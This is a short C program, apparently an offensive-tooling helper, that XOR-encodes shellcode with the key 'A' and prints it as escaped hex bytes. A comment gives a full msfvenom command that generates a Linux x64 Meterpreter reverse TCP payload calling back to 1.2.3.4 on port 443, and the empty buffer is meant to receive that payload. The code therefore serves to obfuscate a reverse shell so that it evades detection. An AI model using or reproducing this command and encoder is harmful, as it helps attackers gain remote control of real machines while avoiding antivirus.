#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f c
unsigned char buf[] = "";

int main (int argc, char **argv)
{
    char xor_key = 'A';
    int payload_length = (int) sizeof(buf);
    for (int i=0; i<payload_length-1; i++)
    {
        printf("\\x%02X",buf[i]^xor_key);
    }
    return 0;
}
